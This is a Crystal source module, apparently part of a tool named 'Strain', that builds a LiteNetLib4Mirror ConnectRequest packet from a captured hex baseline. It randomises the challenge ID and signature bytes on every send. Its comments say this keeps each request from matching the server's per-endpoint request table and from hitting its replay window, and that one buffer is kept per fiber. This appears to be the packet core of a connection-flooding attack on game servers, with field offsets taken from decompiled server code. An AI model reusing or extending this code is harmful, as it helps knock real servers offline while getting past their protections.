require "random"

module Strain
  # Builder + mutator for a structurally-valid LiteNetLib4Mirror
  # ConnectRequest packet. Variable fields (chal_id, signature) are randomised
  # in-place per send so the request never collides with an existing entry in
  # LiteNetLib's _requestsDict (per-IPEndPoint) or hits the server's 12s
  # signature replay window.
  module Packet
    # Anonymized fixture derived from the original research capture.
    # The account identifier is a zero-filled placeholder, not a real account.
    # Captured signature bytes are redacted and replaced on every send.
    private BASELINE_HEX_PARTS = [
      "05 0d 00 00 00 0b 89 22 97 94 a7 de 08 00 00 00",
      "00 10 02 00 1e 61 7f 00 00 01 00 00 00 00 00 00",
      "00 00 00 0e 02 06 00 00 00 00 00 18 00 30 30 30",
      "30 30 30 30 30 30 30 30 30 30 30 30 30 30 40 73",
      "74 65 61 6d f6 c5 f4 69 00 00 00 00 00 03 00 4e",
      "4c 8b 00 30 81 88 02 00 00 00 00 00 00 00 00 00",
      "00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00",
      "00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00",
      "00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00",
      "00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00",
      "00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00",
      "00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00",
      "00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00",
      "00 00 00 00 00 00 00 00 00 00 00 00 00 00",
    ]

    BASELINE_BYTES = BASELINE_HEX_PARTS.join.gsub(' ', "").hexbytes
    SIZE           = BASELINE_BYTES.size

    # Field offsets verified against decompiled CustomLiteNetLib4MirrorTransport
    # ProcessConnectionRequest read sequence (lines 232-235).
    OFF_CHAL_ID =   5
    OFF_SIG     =  87
    SIG_LEN     = 139

    # Mutable scratch buffer pre-loaded with the baseline.
    # Caller MUST keep one buffer per fiber.
    def self.scratch : Bytes
      buf = Bytes.new(SIZE)
      BASELINE_BYTES.copy_to(buf)
      buf
    end

    # Mutate the two fields the server uses for dedup/replay:
    # chal_id_1 (4 byte LE) and the 139-byte signature blob.
    @[AlwaysInline]
    def self.mutate!(buf : Bytes, rng : Random) : Nil
      chal = rng.next_u
      buf[OFF_CHAL_ID] = (chal & 0xff_u32).to_u8
      buf[OFF_CHAL_ID + 1] = ((chal >> 8) & 0xff_u32).to_u8
      buf[OFF_CHAL_ID + 2] = ((chal >> 16) & 0xff_u32).to_u8
      buf[OFF_CHAL_ID + 3] = ((chal >> 24) & 0xff_u32).to_u8
      rng.random_bytes(buf + OFF_SIG)
    end
  end
end
